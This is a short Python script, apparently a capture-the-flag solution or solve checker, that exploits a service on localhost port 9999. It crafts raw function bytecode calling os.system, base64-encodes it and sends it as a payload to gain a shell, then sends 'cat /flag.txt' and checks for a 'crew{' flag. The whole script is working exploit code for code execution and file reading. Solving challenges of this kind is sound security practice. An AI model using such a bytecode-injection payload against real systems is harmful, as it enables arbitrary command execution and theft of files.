from base64 import b64encode
from socket import socket

def g():
    system, print, __import__, '1'
    __import__(system).system('2')

pl = b64encode(g.__code__.co_code)

sock = socket()
sock.connect(('localhost', 9999))
sock.send(pl + b'\n')
sock.recv(1024) # sh error

sock.send(b'cat /flag.txt\n')
resp = sock.recv(1024)
if resp.decode().strip().startswith('crew{'): exit(0)
else: exit(1)